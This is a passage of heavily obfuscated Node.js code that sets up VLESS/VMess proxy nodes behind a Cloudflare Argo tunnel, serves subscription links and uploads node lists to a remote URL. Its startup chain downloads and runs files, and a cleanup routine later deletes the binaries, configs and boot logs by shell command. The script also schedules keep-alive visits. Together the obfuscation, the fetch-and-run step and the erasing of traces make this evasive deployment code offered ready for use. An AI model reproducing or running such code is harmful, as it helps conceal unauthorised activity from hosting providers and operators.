_0x2dcd13={_0x4decfe:0x227,_0x5dd6d4:0x1e9,_0x408f33:0x240,_0x12da99:0x1f1,_0x56048f:0x208,_0x44219f:0x236,_0x5d05bf:0x1d3,_0x393f71:0x210,_0xc90ce0:0x1ef,_0x55c83a:0x24b},_0x3212ab=await _0xfa616b(),_0x1bdd25=NAME?NAME+'-'+_0x3212ab:_0x3212ab;return new Promise(_0x4907bd=>{const _0x3b3f44={_0x5bf4da:0x240,_0x3d1887:0x271,_0x463029:0x274};setTimeout(()=>{const _0x4d9a56=_0x2409,_0x21df68={'v':'2','ps':''+_0x1bdd25,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4d9a56(_0x2dcd13._0x4decfe),'net':'ws','type':_0x4d9a56(0x227),'host':_0x205e12,'path':'/vmess-argo?ed=2560','tls':_0x4d9a56(0x1fc),'sni':_0x205e12,'alpn':'','fp':_0x4d9a56(0x1ba)},_0x5b96a6=_0x4d9a56(0x256)+UUID+'@'+CFIP+':'+CFPORT+_0x4d9a56(0x1cd)+_0x205e12+'&fp=firefox&type=ws&host='+_0x205e12+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1bdd25+_0x4d9a56(_0x2dcd13._0x5dd6d4)+Buffer['from'](JSON[_0x4d9a56(0x232)](_0x21df68))['toString'](_0x4d9a56(_0x2dcd13._0x408f33))+_0x4d9a56(_0x2dcd13._0x12da99)+UUID+'@'+CFIP+':'+CFPORT+_0x4d9a56(_0x2dcd13._0x56048f)+_0x205e12+_0x4d9a56(0x266)+_0x205e12+_0x4d9a56(_0x2dcd13._0x44219f)+_0x1bdd25+_0x4d9a56(_0x2dcd13._0x5d05bf);console[_0x4d9a56(_0x2dcd13._0x393f71)](Buffer[_0x4d9a56(0x27a)](_0x5b96a6)[_0x4d9a56(_0x2dcd13._0xc90ce0)]('base64')),fs[_0x4d9a56(0x243)](subPath,Buffer[_0x4d9a56(0x27a)](_0x5b96a6)[_0x4d9a56(0x1ef)](_0x4d9a56(0x240))),console['log'](FILE_PATH+_0x4d9a56(0x21f)),uploadNodes(),app[_0x4d9a56(_0x2dcd13._0x55c83a)]('/'+SUB_PATH,(_0x37127d,_0x1ff153)=>{const _0x3d67f1=_0x4d9a56,_0x6fb896=Buffer[_0x3d67f1(0x27a)](_0x5b96a6)['toString'](_0x3d67f1(_0x3b3f44._0x5bf4da));_0x1ff153['set'](_0x3d67f1(0x1fd),_0x3d67f1(_0x3b3f44._0x3d1887)),_0x1ff153[_0x3d67f1(_0x3b3f44._0x463029)](_0x6fb896);}),_0x4907bd(_0x5b96a6);},0x7d0);});}}async function uploadNodes(){const _0x3d2d64={_0x3bbdd6:0x206,_0x24f588:0x278,_0x2ca9fd:0x210,_0x5816db:0x221,_0x35df8a:0x273,_0xe0488e:0x203},_0x47494a=_0x55b4b4;if(UPLOAD_URL&&PROJECT_URL){const _0xcc709f=PROJECT_URL+'/'+SUB_PATH,_0x86ea1b={'subscription':[_0xcc709f]};try{const _0x463edb=await axios[_0x47494a(_0x3d2d64._0x3bbdd6)](UPLOAD_URL+_0x47494a(0x20d),_0x86ea1b,{'headers':{'Content-Type':_0x47494a(0x26d)}});return _0x463edb&&_0x463edb[_0x47494a(_0x3d2d64._0x24f588)]===0xc8?(console[_0x47494a(_0x3d2d64._0x2ca9fd)](_0x47494a(0x1b9)),_0x463edb):null;}catch(_0x4eb4d6){if(_0x4eb4d6['response']){if(_0x4eb4d6[_0x47494a(0x258)][_0x47494a(_0x3d2d64._0x24f588)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x47494a(_0x3d2d64._0x5816db)](listPath))return;const _0x81ceff=fs['readFileSync'](listPath,_0x47494a(_0x3d2d64._0x35df8a)),_0x4e1865=_0x81ceff['split']('\x0a')[_0x47494a(0x1c3)](_0x58042f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x47494a(0x26a)](_0x58042f));if(_0x4e1865['length']===0x0)return;const _0x556de8=JSON[_0x47494a(0x232)]({'nodes':_0x4e1865});try{const _0x2ac946=await axios[_0x47494a(_0x3d2d64._0x3bbdd6)](UPLOAD_URL+_0x47494a(_0x3d2d64._0xe0488e),_0x556de8,{'headers':{'Content-Type':'application/json'}});return _0x2ac946&&_0x2ac946['status']===0xc8?(console[_0x47494a(_0x3d2d64._0x2ca9fd)]('Nodes\x20uploaded\x20successfully'),_0x2ac946):null;}catch(_0x2e5e6d){return null;}}else return;}}function cleanFiles(){const _0x4ba5a3={_0x552e15:0x1dc,_0x3d3fbe:0x1e8,_0x192985:0x201,_0x2417f3:0x269};setTimeout(()=>{const _0x3d2b27={_0x1b4e6b:0x210,_0x2b91f6:0x244},_0x406f16=_0x2409,_0x12ccd6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x12ccd6[_0x406f16(_0x4ba5a3._0x552e15)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x12ccd6['push'](phpPath);process['platform']==='win32'?exec(_0x406f16(_0x4ba5a3._0x3d3fbe)+_0x12ccd6['join']('\x20')+_0x406f16(_0x4ba5a3._0x192985),_0x4655db=>{const _0x16beed=_0x406f16;console[_0x16beed(0x1df)](),console[_0x16beed(0x210)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x406f16(0x272)+_0x12ccd6[_0x406f16(_0x4ba5a3._0x2417f3)]('\x20')+'\x20>/dev/null\x202>&1',_0x44303a=>{const _0x34d8f4=_0x406f16;console[_0x34d8f4(0x1df)](),console[_0x34d8f4(_0x3d2b27._0x1b4e6b)](_0x34d8f4(_0x3d2b27._0x2b91f6)),console['log'](_0x34d8f4(0x260));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x456599={_0x322817:0x25b,_0xbcc977:0x206,_0x2e39db:0x209,_0x3960de:0x26d,_0x59e0ef:0x1ff},_0x219f90=_0x55b4b4;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x219f90(0x210)](_0x219f90(_0x456599._0x322817));return;}try{const _0x313c46=await axios[_0x219f90(_0x456599._0xbcc977)](_0x219f90(_0x456599._0x2e39db),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x219f90(_0x456599._0x3960de)}});return console['log'](_0x219f90(0x225)),_0x313c46;}catch(_0x40c0db){return console[_0x219f90(_0x456599._0x59e0ef)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x40c0db['message']),null;}}async function startserver(){const _0x3f0f4e={_0x7ad612:0x1ff,_0x54b2c3:0x1ca},_0x2853ba=_0x55b4b4;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xebf49a){console[_0x2853ba(_0x3f0f4e._0x7ad612)](_0x2853ba(_0x3f0f4e._0x54b2c3),_0xebf49a);}}startserver()[_0x55b4b4(0x1d7)](_0x28ba24=>{const _0x5e6d41={_0x289915:0x1ff,_0x5d5f17:0x242},_0x4d4c19=_0x55b4b4;console[_0x4d4c19(_0x5e6d41._0x289915)](_0x4d4c19(_0x5e6d41._0x5d5f17),_0x28ba24);}),app[_0x55b4b4(0x226)](PORT,()=>console['log'](_0x55b4b4(0x25c)+PORT+'!'));
